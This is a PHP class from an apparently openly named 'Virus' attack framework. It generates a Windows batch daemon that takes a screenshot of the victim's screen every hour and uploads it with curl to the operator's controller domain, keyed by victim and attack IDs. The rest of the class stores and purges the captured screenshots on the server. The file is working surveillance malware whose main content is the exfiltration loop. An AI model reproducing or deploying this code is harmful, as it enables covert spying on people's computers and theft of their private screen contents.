<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot;

/**
 * Class MonitorScreen. Monitors the screen every time interval. Currently it is set to half an hour.
 *
 * Structure of an event saved on disk:
 * events => {
 *   "{unix time}" => "{name}"
 * }
 * And saved events are just a single unix timestamp, and all information is stored in events
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class MonitorScreen extends AttackBase {
    /** @var array<int, string>, array of unix timestamp => name */
    private array $events = [];
    /** @var array<int>, array of unix timestamps */
    private array $savedEvents = [];

    public function getEvents(): array {
        return $this->events;
    }

    public function saveEventFromIntercept(int $unixTime) {
        $this->events[$unixTime] = "";
    }

    public function updateEventFromController(string $jsonEvent, string $unixTime):MonitorScreen {
        $event = json_decode($jsonEvent, true);
        $this->events[$unixTime] = $event["name"];
        return $this;
    }

    public function getSavedEvents(): array {
        return $this->savedEvents;
    }

    public function setSavedEvents(string $jsonSavedEvents): MonitorScreen {
        $this->savedEvents = json_decode($jsonSavedEvents, true);
        return $this;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        @echo off
        :daemon_loop
        if not exist "%~pd0..\..\utils\scst.exe" (exit /b 0)
        "%~pd0..\..\utils\scst.exe" "%~pd0screen.<?php echo Screenshot::$IMG_EXTENSION; ?>"
        curl --form "screen=@%~pd0screen.<?php echo Screenshot::$IMG_EXTENSION; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
        timeout 3600
        goto daemon_loop
        <?php
        //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->events = $state["events"] ?? [];
        $this->savedEvents = $state["savedEvents"] ?? [];
        asort($this->savedEvents);
    }

    protected function getState(): string {
        $state = [];
        $state["events"] = $this->events;
        $state["savedEvents"] = $this->savedEvents;
        return json_encode($state);
    }

    public function purgeEvents() {
        foreach ($this->events as $unixTime => $name) {
            if (in_array($unixTime, $this->savedEvents)) continue;
            if (time() - $unixTime > 24 * 60 * 60) {
                unset($this->events[$unixTime]);
                $filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen-$unixTime.png";
                $this->resetStaticUsage();
                $this->usage()->minusDisk(filesize($filePath))->saveState();
                $this->reportStaticUsage();
                unlink($filePath);
            }
        }
    }
}
